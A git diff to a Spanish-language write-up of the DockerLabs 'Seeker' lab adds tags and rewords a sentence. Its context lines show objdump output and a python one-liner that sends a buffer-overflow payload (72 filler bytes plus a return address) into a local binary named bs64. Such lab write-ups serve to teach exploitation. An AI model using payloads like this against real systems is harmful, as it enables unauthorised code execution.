@@ -4,7 +4,7 @@ summary: "Write-up del laboratorio Seeker de DockerLabs"
 author: elcybercurioso
 date: 2026-02-03 12:52:37
 categories: [Post, DockerLabs]
-tags: []
+tags: [medio, information leaking, subdomain enumeration, rot codification, arbitrary file upload, rce, sudo, busybox, buffer overflow]
 media_subpath: "/assets/img/posts/dockerlabs_seeker"
 image:
   path: main.webp
@@ -485,7 +485,7 @@ astu@4721c7b38691:~/secure$ objdump -d bs64 | grep -C 8 401387
   40139d:       c3                      ret
 ```
 
-Vemos que, tras construir el comando que se encargará de enviar el payload y ejecutar posteriormente el binario `bs64`, está sobrescribiendo el buffer correctamente:
+Tras construir el comando que se encargará de enviar el payload y ejecutar posteriormente el binario `bs64`, comprobamos que está sobrescribiendo el buffer correctamente:
 
 ```bash
 astu@4721c7b38691:~/secure$ python3 -c 'import sys; sys.stdout.buffer.write(b"A"*72+b"\x6a\x13\x40\x00\x00\x00\x00\x00")' | ./bs64
